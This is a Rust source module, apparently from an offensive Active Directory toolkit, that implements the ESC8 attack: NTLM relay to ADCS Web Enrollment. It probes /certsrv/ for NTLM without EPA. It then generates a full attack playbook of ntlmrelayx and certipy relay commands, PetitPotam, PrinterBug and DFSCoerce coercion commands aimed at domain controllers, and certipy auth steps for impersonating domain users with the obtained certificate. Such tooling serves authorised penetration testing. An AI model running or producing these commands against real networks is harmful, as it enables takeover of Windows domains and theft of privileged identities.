//! ESC8 — NTLM Relay to ADCS Web Enrollment
//!
//! When ADCS Web Enrollment is exposed over HTTP (not HTTPS-only)
//! and doesn't enforce EPA (Extended Protection for Authentication),
//! an attacker can relay NTLM authentication to the /certsrv/ endpoint
//! and request a certificate on behalf of the relayed identity.
//!
//! This module provides:
//! - Target validation (checks if HTTP enrollment is reachable)
//! - Command generation for ntlmrelayx.py / Certipy relay
//! - Coercion command generation (PetitPotam, PrinterBug, etc.)
//!
//! The actual relay listener lives in overthrone-hunter's relay module.
//!
//! Reference: SpecterOps "Certified Pre-Owned" — ESC8

use crate::error::{OverthroneError, Result};
use tracing::info;

// ═══════════════════════════════════════════════════════════
// ESC8 Relay Target
// ═══════════════════════════════════════════════════════════

/// Target configuration for ESC8 NTLM relay attack
#[derive(Debug, Clone)]
pub struct Esc8RelayTarget {
    /// CA server hostname or IP
    pub ca_server: String,
    /// Certificate template to request
    pub template: String,
    /// Target UPN to impersonate (if SAN is supported)
    pub target_upn: Option<String>,
    /// Use HTTPS instead of HTTP
    pub use_https: bool,
}

impl Esc8RelayTarget {
    pub fn new(ca_server: impl Into<String>, template: impl Into<String>) -> Self {
        Self {
            ca_server: ca_server.into(),
            template: template.into(),
            target_upn: None,
            use_https: false,
        }
    }

    /// Set target UPN for impersonation
    pub fn with_upn(mut self, upn: impl Into<String>) -> Self {
        self.target_upn = Some(upn.into());
        self
    }

    /// Use HTTPS endpoint
    pub fn with_https(mut self) -> Self {
        self.use_https = true;
        self
    }

    /// Get the enrollment URL
    pub fn enrollment_url(&self) -> String {
        let scheme = if self.use_https { "https" } else { "http" };
        format!("{}://{}/certsrv/certfnsh.asp", scheme, self.ca_server)
    }
}

// ═══════════════════════════════════════════════════════════
// ESC8 Attack Configuration
// ═══════════════════════════════════════════════════════════

/// Configuration for an ESC8 relay attack
pub struct Esc8AttackConfig {
    /// IP address to listen on for incoming NTLM auth
    pub listener_ip: String,
    /// Listener port (default: 445 for SMB, 80 for HTTP)
    pub listener_port: u16,
    /// Relay target
    pub target: Esc8RelayTarget,
    /// Domain for context
    pub domain: String,
}

impl Esc8AttackConfig {
    pub fn new(
        listener_ip: impl Into<String>,
        target: Esc8RelayTarget,
        domain: impl Into<String>,
    ) -> Self {
        Self {
            listener_ip: listener_ip.into(),
            listener_port: 445,
            target,
            domain: domain.into(),
        }
    }

    /// Set custom listener port
    pub fn with_port(mut self, port: u16) -> Self {
        self.listener_port = port;
        self
    }

    /// Validate that the web enrollment endpoint is reachable.
    ///
    /// Makes an unauthenticated HTTP request to /certsrv/ and checks
    /// for the expected 401 (NTLM required) or 200 response.
    pub async fn check_endpoint_reachable(&self) -> Result<EndpointCheckResult> {
        let url = format!(
            "{}://{}/certsrv/",
            if self.target.use_https {
                "https"
            } else {
                "http"
            },
            self.target.ca_server
        );

        info!("Checking web enrollment endpoint: {}", url);

        let client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(std::time::Duration::from_secs(10))
            .redirect(reqwest::redirect::Policy::none())
            .build()
            .map_err(|e| OverthroneError::Connection {
                target: url.clone(),
                reason: format!("HTTP client failed: {}", e),
            })?;

        let resp = client
            .get(&url)
            .send()
            .await
            .map_err(|e| OverthroneError::Connection {
                target: url.clone(),
                reason: format!("Request failed: {}", e),
            })?;

        let status = resp.status().as_u16();
        let headers = resp.headers().clone();

        // Check for NTLM auth header
        let www_auth = headers
            .get("www-authenticate")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("")
            .to_string();

        let ntlm_supported = www_auth.to_lowercase().contains("ntlm")
            || www_auth.to_lowercase().contains("negotiate");

        let epa_enforced = headers
            .get("www-authenticate")
            .and_then(|v| v.to_str().ok())
            .map(|v| v.contains("MutualAuth"))
            .unwrap_or(false);

        let vulnerable = (status == 401 || status == 200) && ntlm_supported && !epa_enforced;

        let result = EndpointCheckResult {
            url,
            status_code: status,
            ntlm_supported,
            epa_enforced,
            vulnerable,
        };

        if vulnerable {
            info!("[!] Web enrollment is VULNERABLE to ESC8 relay!");
        } else {
            info!(
                "Web enrollment check: status={}, ntlm={}, epa={}",
                status, ntlm_supported, epa_enforced
            );
        }

        Ok(result)
    }

    /// Generate full ESC8 relay attack command set
    pub fn generate_exploit_commands(&self) -> Result<String> {
        info!("Generating ESC8 relay attack instructions");

        let enrollment_url = self.target.enrollment_url();
        let upn_flag = self
            .target
            .target_upn
            .as_ref()
            .map(|u| format!(" --upn {}", u))
            .unwrap_or_default();

        let ntlmrelayx_cmd = format!(
            "ntlmrelayx.py -t {} -smb2support --adcs --template '{}'{}",
            enrollment_url, self.target.template, upn_flag
        );

        let certipy_relay_cmd = format!(
            "certipy relay -target '{}' -template '{}'{}",
            enrollment_url, self.target.template, upn_flag
        );

        // Coercion commands
        let petitpotam_cmd = format!("python3 PetitPotam.py {} <TARGET_DC_IP>", self.listener_ip);

        let printerbug_cmd = format!(
            "python3 printerbug.py '{}'/username:password@<TARGET_DC> {}",
            self.domain, self.listener_ip
        );

        let dfscoerce_cmd = format!(
            "python3 dfscoerce.py -d '{}' -u username -p password {} <TARGET_DC>",
            self.domain, self.listener_ip
        );

        Ok(format!(
            "╔═══════════════════════════════════════════════╗\n\
             ║       ESC8 — NTLM Relay to Web Enrollment      ║\n\
             ╚═══════════════════════════════════════════════╝\n\n\
             Target: {url}\n\
             Template: {template}\n\
             Listener: {listener}:{port}\n\
             {upn_line}\n\n\
             ── Step 1: Start Relay Listener ───────────────\n\n\
             [ntlmrelayx (Impacket)]\n\
             {ntlmrelayx}\n\n\
             [Certipy]\n\
             {certipy}\n\n\
             ── Step 2: Coerce Authentication ──────────────\n\
             Choose one method to force a machine account to\n\
             authenticate to your listener at {listener}:\n\n\
             [PetitPotam (unauthenticated)]\n\
             {petitpotam}\n\n\
             [PrinterBug / SpoolSample]\n\
             {printerbug}\n\n\
             [DFSCoerce]\n\
             {dfscoerce}\n\n\
             ── Step 3: Use the Certificate ────────────────\n\
             certipy auth -pfx <CERT.pfx> -dc-ip <DC_IP>\n\n\
             Note: The relayed machine account's certificate can be\n\
             used for S4U2Self to impersonate any domain user.\n",
            url = enrollment_url,
            template = self.target.template,
            listener = self.listener_ip,
            port = self.listener_port,
            upn_line = self
                .target
                .target_upn
                .as_ref()
                .map(|u| format!("Target UPN: {}", u))
                .unwrap_or_default(),
            ntlmrelayx = ntlmrelayx_cmd,
            certipy = certipy_relay_cmd,
            petitpotam = petitpotam_cmd,
            printerbug = printerbug_cmd,
            dfscoerce = dfscoerce_cmd,
        ))
    }
}

// ═══════════════════════════════════════════════════════════
// Result types
// ═══════════════════════════════════════════════════════════

/// Result of endpoint reachability check
#[derive(Debug, Clone)]
pub struct EndpointCheckResult {
    pub url: String,
    pub status_code: u16,
    pub ntlm_supported: bool,
    pub epa_enforced: bool,
    pub vulnerable: bool,
}

impl std::fmt::Display for EndpointCheckResult {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        if self.vulnerable {
            writeln!(f, "[!] ESC8 VULNERABLE: {}", self.url)?;
            writeln!(f, "    Status: {}", self.status_code)?;
            writeln!(f, "    NTLM: enabled, EPA: not enforced")?;
        } else {
            writeln!(f, "[✓] {} — Not vulnerable to ESC8", self.url)?;
            writeln!(
                f,
                "    Status: {}, NTLM: {}, EPA: {}",
                self.status_code, self.ntlm_supported, self.epa_enforced
            )?;
        }
        Ok(())
    }
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_relay_target_creation() {
        let target =
            Esc8RelayTarget::new("ca.corp.local", "Machine").with_upn("administrator@corp.local");
        assert_eq!(target.ca_server, "ca.corp.local");
        assert_eq!(target.template, "Machine");
        assert_eq!(
            target.target_upn,
            Some("administrator@corp.local".to_string())
        );
        assert!(!target.use_https);
    }

    #[test]
    fn test_enrollment_url() {
        let target = Esc8RelayTarget::new("ca.corp.local", "User");
        assert_eq!(
            target.enrollment_url(),
            "http://ca.corp.local/certsrv/certfnsh.asp"
        );

        let target_https = Esc8RelayTarget::new("ca.corp.local", "User").with_https();
        assert_eq!(
            target_https.enrollment_url(),
            "https://ca.corp.local/certsrv/certfnsh.asp"
        );
    }

    #[test]
    fn test_attack_config() {
        let target = Esc8RelayTarget::new("ca.corp.local", "Machine");
        let config = Esc8AttackConfig::new("10.0.0.5", target, "corp.local");
        assert_eq!(config.listener_ip, "10.0.0.5");
        assert_eq!(config.listener_port, 445);
    }

    #[test]
    fn test_exploit_commands() {
        let target = Esc8RelayTarget::new("ca.corp.local", "Machine").with_upn("admin@corp.local");
        let config = Esc8AttackConfig::new("10.0.0.5", target, "corp.local");
        let cmds = config.generate_exploit_commands().unwrap();

        assert!(cmds.contains("ntlmrelayx"));
        assert!(cmds.contains("certipy relay"));
        assert!(cmds.contains("PetitPotam"));
        assert!(cmds.contains("printerbug"));
        assert!(cmds.contains("dfscoerce"));
        assert!(cmds.contains("Machine"));
        assert!(cmds.contains("admin@corp.local"));
    }

    #[test]
    fn test_endpoint_check_display() {
        let result = EndpointCheckResult {
            url: "http://ca.corp.local/certsrv/".to_string(),
            status_code: 401,
            ntlm_supported: true,
            epa_enforced: false,
            vulnerable: true,
        };
        let display = format!("{}", result);
        assert!(display.contains("VULNERABLE"));

        let safe = EndpointCheckResult {
            url: "https://ca.corp.local/certsrv/".to_string(),
            status_code: 403,
            ntlm_supported: false,
            epa_enforced: true,
            vulnerable: false,
        };
        let display = format!("{}", safe);
        assert!(display.contains("Not vulnerable"));
    }
}
